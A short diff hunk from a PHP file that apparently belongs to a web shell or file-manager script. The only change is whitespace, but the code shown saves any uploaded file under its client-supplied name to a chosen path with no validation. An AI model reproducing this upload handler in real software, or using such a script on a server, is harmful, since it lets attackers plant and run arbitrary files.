@@ -208,7 +208,7 @@ echo '<br>[ <a href="?">Home</a> ] </font></td><td align="center" width="27%"><f
 if (isset($_FILES['file'])) {
     if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
         echo '<center><font color="#00ff00">Upload Success!</font></center><br/>';
-    } else {
+    } else { 
         echo '<center><font color="red">Upload FAILED!</font></center><br/>';
     }
 }
